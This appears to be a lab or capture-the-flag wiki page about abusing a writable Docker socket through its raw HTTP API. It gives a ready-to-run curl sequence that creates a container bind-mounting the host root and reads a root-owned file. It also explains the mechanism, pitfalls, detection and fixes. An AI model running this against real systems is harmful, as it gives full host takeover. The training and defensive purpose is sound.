# C08 · Station C — the raw socket API · ★★★☆

> **Chapter:** [[Chapter-08-Overview]] · **Next:** [[Chapter-09-Overview]]
> **Host:** `hollow-forge-01` (`target-docker`) · **Access:** write on `/var/run/docker.sock`
> **The bug:** the socket's HTTP API is the attack surface — no `docker` client needed.

---

## 1. Exploit — do this first

```bash
CID=$(curl -s --unix-socket /var/run/docker.sock -X POST -H 'Content-Type: application/json' \
  -d '{"Image":"rtr/bb","Cmd":["chroot","/host","cat","/root/flag.txt"],"HostConfig":{"Binds":["/:/host"]}}' \
  http://localhost/containers/create | jq -r .Id)
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/$CID/start
curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/$CID/wait
curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$CID/logs?stdout=1" | tr -cd '[:print:]\n'
```

---

## 2. How you find it

The `docker` CLI is just an HTTP client for the socket. If a box exposes
`docker.sock` but has no `docker` binary — common when the socket is **mounted**
into another container (CI runner, Portainer agent) — `curl` is enough.

## 3. Why it works

`POST /containers/create` with `HostConfig.Binds: ["/:/host"]` is the API form of
`-v /:/host`; `start` runs it; `logs` streams output (8-byte frame headers,
stripped with `tr -cd '[:print:]\n'`). This is the version that matters in the
real world: a mounted `docker.sock` is a full host takeover from an app that
ships no docker tooling at all.

## 4. Pitfalls

- The logs stream is multiplexed with binary frame headers — strip them (`tr`/`strings`).
- Need `jq` (or parse the `Id` by hand) to grab the container id.

## 5. Detect & fix

- **Detect:** `auditctl -w /var/run/docker.sock -p rw`; API `containers/create` with host binds in daemon logs.
- **Fix:** never mount the raw socket into untrusted containers — use a filtering `docker-socket-proxy`; rootless runtime; `userns-remap`. [[Blue-Team-Playbook]].

## 6. What you learned

- The CLI is optional; the socket's API is the surface — which is why a *mounted* `docker.sock` is catastrophic.

> Next chapter: [[Chapter-09-Overview]] · Related: [[C08-Station-A-mount-chroot]]
